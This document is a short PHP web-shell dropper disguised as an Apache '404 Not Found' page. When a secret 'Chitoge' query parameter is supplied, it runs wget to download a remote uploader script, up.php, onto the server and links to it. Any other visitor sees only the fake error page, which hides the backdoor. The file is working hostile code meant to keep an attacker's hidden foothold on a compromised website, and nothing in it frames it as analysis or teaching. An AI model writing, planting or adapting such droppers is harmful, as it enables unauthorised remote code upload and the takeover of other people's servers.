<?php
if(isset($_GET['Chitoge'])){
?>
<?php
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	}
}

		$exec=exec('wget https://raw.githubusercontent.com/ndhet/project/refs/heads/master/up.php -O up.php');
        if(file_exists('./up.php')){
            echo '<center><a href=./up.php target="_blank"> up.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}
else{
/*-----------------------------------------------------------------------------------*/
echo "<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>

<h1>Not Found</h1>

The requested URL ";
echo $_SERVER['REQUEST_URI'];
echo "
was not found on this server.
<hr>

";
echo "<address>Apache Server at ".$_SERVER['HTTP_HOST']." Port 80</address>";
/*--------------------------------------------------------------------------------------*/
}
?>
</center>
</html>
